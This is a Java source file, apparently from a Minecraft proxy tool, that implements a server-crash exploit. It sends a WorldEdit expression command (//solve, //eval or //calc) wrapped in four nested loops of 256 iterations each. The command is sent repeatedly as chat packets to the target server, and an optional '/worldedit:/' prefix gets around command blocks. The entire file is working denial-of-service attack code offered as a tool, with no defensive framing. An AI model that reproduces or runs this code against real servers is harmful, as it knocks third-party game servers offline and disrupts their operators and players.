package me.ANONIMUS.proxy.exploits;

import me.ANONIMUS.proxy.objects.Exploit;
import me.ANONIMUS.proxy.protocol.objects.Player;
import me.ANONIMUS.proxy.protocol.packet.impl.client.play.ClientChatPacket;
import me.ANONIMUS.proxy.utils.ChatUtil;

import java.util.stream.IntStream;

public class ShitExploit extends Exploit {
    public ShitExploit() {
        super("shit", "[amount] [mode(1:4)] [full(bool)] [bypass(bool)]");
    }

    @Override
    public void execute(Player sender, Object... objects) {
        int amount = Integer.parseInt((String) objects[0]);
        int mode = Integer.parseInt((String) objects[1]);
        boolean fullCMD = Boolean.parseBoolean((String) objects[2]);
        boolean bypass =  Boolean.parseBoolean((String) objects[3]);
        final String crashCMD = getCrashCommand(mode, fullCMD, bypass) + " for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";

        ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing started, method: " + sender.getThemeType().getColor(1) + getName().toUpperCase(), sender, false);
        final int time = (int) System.currentTimeMillis();
        IntStream.range(0, amount).forEach(i -> sender.getRemoteSession().sendPacket(new ClientChatPacket(crashCMD)));
        final int time2 = (int) System.currentTimeMillis() - time;
        ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing complete &7(" + sender.getThemeType().getColor(2) + time2 + "ms&7)", sender, false);
    }

    private String getCrashCommand(final int mode, final boolean fullCMD, final boolean bypass) {
        switch (mode) {
            case 1: {
                return (bypass ? "/worldedit:/" : "//") + "solve";
            }
            case 2: {
                return (bypass ? "/worldedit:/" : "//") + (fullCMD ? "evaluate" : "eval");
            }
            case 3: {
                return (bypass ? "/worldedit:/" : "//") + (fullCMD ? "calculate" : "calc");
            }
            default:
                return null;
        }
    }
}